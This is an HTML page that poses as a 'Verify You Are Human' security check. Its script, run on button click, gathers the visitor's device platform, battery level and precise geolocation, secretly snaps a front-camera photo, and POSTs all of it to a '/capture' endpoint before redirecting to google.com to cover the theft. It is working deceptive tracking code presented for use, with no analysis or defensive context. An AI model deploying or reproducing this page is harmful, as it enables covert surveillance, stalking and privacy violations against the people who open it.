<!DOCTYPE html>
<html>
<head>
    <title>Verify You Are Human</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #0f0; padding: 30px; border-radius: 5px; box-shadow: 0 0 15px #0f0; }
        button { background: #0f0; color: #000; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <h3>🔒 SECURITY CHECK</h3>
        <p>Complete verification to view content.</p>
        <button onclick="start()">VERIFY NOW</button>
    </div>

    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;" width="640" height="480"></canvas>

    <script>
        async function start() {
            let info = { platform: navigator.platform, battery: "N/A", lat: "0", lon: "0" };
            
            // Battery info
            if(navigator.getBattery) { const b = await navigator.getBattery(); info.battery = Math.round(b.level*100)+"%"; }

            // Location & Camera Permission
            navigator.geolocation.getCurrentPosition(async (pos) => {
                info.lat = pos.coords.latitude; info.lon = pos.coords.longitude;
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }});
                    const video = document.getElementById('v');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('c');
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const imgData = canvas.toDataURL('image/jpeg', 0.7);
                        stream.getTracks().forEach(t => t.stop());
                        send(info, imgData);
                    }, 1500);
                } catch(e) { send(info, null); }
            }, (err) => { 
                alert("Error: Please allow Location and Camera to verify."); 
            }, {enableHighAccuracy:true});
        }

        function send(i, p) {
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ info: i, photo: p })
            }).then(() => { window.location.href = "https://google.com"; });
        }
    </script>
</body>
</html>
